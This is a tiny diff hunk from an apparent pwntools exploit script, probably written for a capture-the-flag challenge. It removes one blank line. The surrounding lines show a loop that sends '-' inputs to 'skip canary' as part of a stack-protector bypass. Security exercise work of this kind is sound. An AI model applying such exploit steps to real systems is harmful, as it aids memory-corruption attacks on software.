@@ -25,7 +25,6 @@ def hex_to_double_as_bytes(hex_number):
 
 r = start()
 #========= exploit here ===================
-
 #1
 for i in range(19):
     r.sendlineafter(b"input:",b"-") #skip canary
